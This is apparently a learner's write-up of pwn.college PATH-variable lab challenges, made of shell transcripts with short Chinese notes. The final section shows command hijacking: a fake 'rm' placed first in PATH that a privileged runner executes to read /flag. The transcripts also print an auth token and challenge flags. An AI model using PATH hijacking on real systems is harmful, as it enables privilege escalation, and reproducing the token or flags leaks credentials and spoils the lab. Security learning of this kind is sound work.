# 1

```sh
hacker@path~the-path-variable:~$ env
SHELL=/run/dojo/bin/bash
COLORTERM=truecolor
TERM_PROGRAM_VERSION=1.89.1
HOSTNAME=path~the-path-variable
VSCODE_PROXY_URI=https://pwn.college/workspace/code/proxy/{{port}}/
PWD=/home/hacker
DOJO_AUTH_TOKEN=937a85c4ab01c5c993e0bed100026b89d09beaaca1f01d60926bad2dba7cf2cb
VSCODE_GIT_ASKPASS_NODE=/nix/store/bmmjbvb8hishfrg78ygjlynpq3ikpl39-nodejs-20.15.1/bin/node
HOME=/home/hacker
LANG=C.UTF-8
GIT_ASKPASS=/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/extensions/git/dist/askpass.sh
VSCODE_GIT_ASKPASS_EXTRA_ARGS=
TERM=xterm-256color
VSCODE_GIT_IPC_HANDLE=/tmp/vscode-git-7612a7a2d2.sock
SHLVL=2
LC_CTYPE=C.UTF-8
VSCODE_GIT_ASKPASS_MAIN=/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/extensions/git/dist/askpass-main.js
BROWSER=/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/bin/helpers/browser.sh
PATH=/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/bin/remote-cli:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_EXEC_PATH=/nix/store/bmmjbvb8hishfrg78ygjlynpq3ikpl39-nodejs-20.15.1/bin/node
TERM_PROGRAM=vscode
VSCODE_IPC_HOOK_CLI=/tmp/vscode-ipc-661476e9-518c-4135-af15-899328e846c9.sock
_=/run/workspace/bin/env


hacker@path~the-path-variable:~$ PATH=""

hacker@path~the-path-variable:~$ env
bash: sed: No such file or directory
bash: env: No such file or directory

hacker@path~the-path-variable:~$ ls
bash: sed: No such file or directory
bash: ls: No such file or directory

hacker@path~the-path-variable:~$ /challenge/run 
bash: sed: No such file or directory
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{Qxucz32pIlS3OEvphJobCJKqJpI.QX2cDM1wCO5IzW}
hacker@path~the-path-variable:~$ 
```



# 2

```sh
hacker@path~setting-path:~$ ls -l /challenge/
total 12
-rwsr-xr-x 1 root root 1318 Jul  4 08:44 DESCRIPTION.md
drwsr-xr-x 2 root root 4096 Jul  4 08:44 more_commands
-rwsr-xr-x 1 root root  163 Jul  4 08:45 run

hacker@path~setting-path:~$ ls -l /challenge/more_commands/
total 4
-rwsr-xr-x 1 root root 281 Jul  4 08:44 win

hacker@path~setting-path:~$ PATH=/challenge/more_commands/

hacker@path~setting-path:~$ env
bash: sed: command not found
bash: env: command not found

hacker@path~setting-path:~$ ls
bash: sed: command not found
bash: ls: command not found

hacker@path~setting-path:~$ win
bash: sed: command not found
It looks like 'win' was improperly launched. Don't launch it directly; it MUST 
be launched by /challenge/run!


hacker@path~setting-path:~$ /challenge/run 
bash: sed: command not found
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{M-Pw_6fvbBGhs19E5cogAgj85Oe.QX1cjM1wCO5IzW}


hacker@path~setting-path:~$ win
bash: sed: command not found
It looks like 'win' was improperly launched. Don't launch it directly; it MUST 
be launched by /challenge/run!


hacker@path~setting-path:~$ 
```



# 3

```sh
hacker@path~adding-commands:~$ /challenge/run 
Invoking 'win'....
/challenge/run: line 4: win: command not found
It looks like that did not work... Did you set PATH correctly?

hacker@path~adding-commands:~$ echo $PATH
/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/bin/remote-cli:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

hacker@path~adding-commands:~$ cd ~
hacker@path~adding-commands:~$ ls
flag  lost+found  my_command  past  x.sh
hacker@path~adding-commands:~$ cd my_command/
hacker@path~adding-commands:~/my_command$ 
hacker@path~adding-commands:~/my_command$ ls
win.sh
hacker@path~adding-commands:~/my_command$ cat win.sh 
cat /flag

hacker@path~adding-commands:~/my_command$ ./win.sh 
cat: /flag: Permission denied

hacker@path~adding-commands:~/my_command$ mv ./win.sh ./win
hacker@path~adding-commands:~/my_command$ ls
win
hacker@path~adding-commands:~/my_command$ ./win 
cat: /flag: Permission denied

hacker@path~adding-commands:~/my_command$ /challenge/run 
Invoking 'win'....
/challenge/run: line 4: win: command not found
It looks like that did not work... Did you set PATH correctly?

$ PATH=/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/bin/remote-
cli:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/hacker/my_command/

hacker@path~adding-commands:~/my_command$ /challenge/run 
Invoking 'win'....
pwn.college{kf5cpXNMNsu17-pcLSTpNzueq1h.QX2cjM1wCO5IzW}
hacker@path~adding-commands:~/my_command$ 
```

好烦啊





# 4

```sh
drwxr-xr-x    1 root root 4096 Apr 15  2020 boot
drwxr-xr-x    1 root root 4096 Oct 19 09:26 challenge
drwxr-xr-x    6 root root  380 Oct 19 09:26 dev
drwxr-xr-x    1 root root 4096 Oct 19 09:26 etc
drwxr-xr-x    1 root root 4096 Oct  4 23:06 home
drwxr-xr-x    1 root root 4096 May 30 02:03 media
drwxr-xr-x    1 root root 4096 May 30 02:03 mnt
drwxr-xr-x    4 root root 4096 Sep  6 16:54 nix
drwxr-xr-x    1 root root 4096 Sep  6 16:42 opt
dr-xr-xr-x 2171 root root    0 Oct 19 09:26 proc
drwx------    1 root root 4096 Sep  6 16:43 root
drwxr-xr-x    1 root root 4096 Oct 19 09:26 run
drwxr-xr-x    1 root root 4096 May 30 02:03 srv
dr-xr-xr-x   13 root root    0 Sep 15 23:33 sys
drwxrwxrwt    1 root root 4096 Oct 19 09:26 tmp
drwxr-xr-x    1 root root 4096 Sep  6 16:24 usr
drwxr-xr-x    1 root root 4096 May 30 02:07 var
```

思路是：shell在寻找指令的时候，是按照PATH的目录顺序一个一个找，找到就运行。

所以我们直接把我们写的假的rm指令放在最前边，这样challenge运行rm就会直接运行我们的家的rm指令。



出来了

```sh
hacker@path~hijacking-commands:~$ which rm
/run/workspace/bin/rm
hacker@path~hijacking-commands:~$ echo $PATH
/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/bin/remote-cli:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ PATH=/home/hacker/my_command/:/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/bin/remote-cli:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ cat /home/hacker/my_command/rm 
echo "fuck you college!"
cat /flag
hacker@path~hijacking-commands:~$ rm
fuck you college!
cat: /flag: Permission denied

hacker@path~hijacking-commands:~$ which rm
/home/hacker/my_command/rm

hacker@path~hijacking-commands:~$ /challenge/run 
Trying to remove /flag...
Found 'rm' command at /home/hacker/my_command//rm. Executing!
fuck you college!
pwn.college{gbD4vcqGhmil4mKQa5ugGbCZcV6.QX3cjM1wCO5IzW}

hacker@path~hijacking-commands:~$ 

```
